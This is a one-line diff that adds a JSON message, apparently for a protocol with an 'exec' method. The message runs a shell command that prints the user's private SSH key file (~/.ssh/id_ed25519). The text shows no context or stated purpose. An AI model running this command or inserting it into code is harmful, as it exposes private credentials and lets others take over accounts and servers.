@@ -1,0 +1,1 @@
+{ "t": "emit", "copy": "files:files", "method": "exec", "args": ["sh", ["-c", "cat ~/.ssh/id_ed25519"]] }
